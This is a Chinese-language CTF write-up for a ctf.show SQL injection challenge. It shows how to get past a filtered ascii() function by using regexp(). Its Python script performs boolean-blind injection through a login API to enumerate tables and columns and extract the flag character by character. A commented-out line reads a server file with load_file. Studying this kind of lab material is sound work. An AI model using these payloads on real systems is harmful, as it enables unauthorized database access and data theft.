# 知识点
### 用regexp替代ascii
### 或者用ord函数替代ascii
# 思路
题目过滤了ascii函数，我们用regexp函数来代替它
### 方法一
```python
import requests
url = 'http://ea1fad3d-5819-41f4-bca3-0508c131ef17.challenge.ctf.show/api/'
str = ''
string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
for i in range(60):
    print(i)
    for j in string:
        # 爆数据库
        # payload1 = {
        #     'username': f"' or if(ascii(substr(()))",
        #     'password': f"123"
        # }
        # 爆表名
        # payload = {
        #     'username': f"' or if(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1)regexp('{j}'),1,0)#",
        #     'password': f"123"
        # }
        # # 爆列
        # payload = {
        #     'username': f"' or if(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{i},1)regexp('{j}'),1,0)#",
        #     'password': f"123"
        # }
        # 爆值
        payload = {
            'username': f"' or if(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1)regexp('{j}'),1,0)#",
            'password': f"123"
        }
        # payload = {'username':f"if(load_file('/var/www/html/api/index.php')regexp('{flag+j}'),0,1)",
        #            'password':0}
        r = requests.post(url=url,data=payload).text
        # print(j+r)
        if(r'\u5bc6\u7801\u9519\u8bef' in r):
            str += j
            print(str)
            break
```
![image.png](./images/20231017_2351472313.png)
### 方法二 用ord函数替代ascii
